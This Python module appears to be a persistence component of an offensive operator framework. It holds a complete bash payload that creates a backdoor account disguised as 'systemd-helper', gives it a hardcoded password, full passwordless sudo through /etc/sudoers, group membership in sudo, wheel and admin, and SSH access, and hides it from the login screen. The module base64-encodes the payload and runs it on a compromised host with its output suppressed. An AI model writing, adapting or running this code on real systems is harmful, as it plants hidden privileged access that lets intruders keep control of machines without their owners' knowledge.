"""Backdoor user creation script."""

from ..base import OperatorScript, ScriptResult


class BackdoorUser(OperatorScript):
    """Create stealthy backdoor user account."""
    
    name = "Backdoor User"
    description = "Create stealthy backdoor user with elevated privileges"
    category = "persist"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] BACKDOOR USER CREATION"
echo "========================="
echo ""

USERNAME="systemd-helper"
PASSWORD="P@ssw0rd123!"

echo "[+] Creating backdoor user: $USERNAME"
if id "$USERNAME" &>/dev/null; then
    echo "[!] User $USERNAME already exists"
else
    useradd -m -s /bin/bash -G sudo,wheel,admin "$USERNAME" 2>/dev/null && \
        echo "[+] User created successfully" || \
        echo "[-] Failed to create user (may need root)"
fi

echo "[+] Setting password..."
echo "$USERNAME:$PASSWORD" | chpasswd 2>/dev/null && \
    echo "[+] Password set" || \
    echo "[-] Failed to set password"

echo "[+] Adding sudo privileges (no password)..."
echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null && \
    echo "[+] Sudo access granted" || \
    echo "[-] Failed to add sudo access"

echo "[+] Hiding from login screen..."
if [ -d /var/lib/AccountsService/users ]; then
    cat > /var/lib/AccountsService/users/$USERNAME <<EOF
[User]
SystemAccount=true
EOF
    echo "[+] Hidden from GUI login"
fi

echo "[+] Adding SSH access..."
mkdir -p /home/$USERNAME/.ssh 2>/dev/null
chmod 700 /home/$USERNAME/.ssh
echo "[*] Add your SSH public key to /home/$USERNAME/.ssh/authorized_keys"

echo ""
echo "[+] Backdoor user details:"
echo "    Username: $USERNAME"
echo "    Password: $PASSWORD"
echo "    Groups: $(groups $USERNAME 2>/dev/null)"
echo "    Home: /home/$USERNAME"
echo ""

echo "[+] Testing sudo access:"
su - $USERNAME -c "sudo -n whoami" 2>/dev/null && \
    echo "[+] Sudo works without password" || \
    echo "[-] Sudo not configured properly"

echo ""
echo "[+] To use: ssh $USERNAME@target_ip"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Creating backdoor user...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="Backdoor user creation executed",
                metadata={"script": "backdoor_user", "username": "systemd-helper"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
